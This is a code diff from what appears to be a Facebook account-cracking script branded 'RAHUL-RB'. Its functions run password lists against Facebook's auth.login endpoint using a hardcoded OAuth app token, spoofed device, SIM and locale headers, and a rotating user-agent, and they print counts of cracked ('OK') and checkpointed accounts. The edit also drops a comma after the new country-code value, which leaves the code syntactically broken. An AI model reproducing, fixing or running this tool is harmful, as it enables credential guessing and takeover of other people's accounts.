@@ -418,7 +418,8 @@ def api2(ids,names,passlist):
                                         'source':'login','format':'json',
                                         'generate_session_cookies':'1',
                                         'generate_analytics_claim':'1',
-                                        "locale":"en_US","client_country_code":"US",
+                                        "locale":'bn_IN',
+                                        "client_country_code":'IN'
                                         'device':gtt,
                                         'device_id':str(uuid.uuid4()),
                                         "method": "auth.login",
@@ -429,7 +430,7 @@ def api2(ids,names,passlist):
                                         'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                                         'x-fb-connection-type':'unknown',
                                         'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-                                        'user-agent':'Mozilla/5.0 (Linux; Android 13; SM-G780G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]',
+                                        'user-agent':ugen,
                                         'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                         'x-fb-connection-bandwidth':str(random.randint(2e7, 3e7)),
                                         'x-fb-connection-quality':'EXCELLENT',
@@ -461,7 +462,7 @@ def api2(ids,names,passlist):
 def api5(ids,names,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write(f"\r {S}[RAHUL-RB] {loop} | OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
+                        sys.stdout.write('\r\r\033[1;37m [RAHUL-RB M5] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         fn = names.split(' ')[0]
                         try:
                                 ln = names.split(' ')[1]
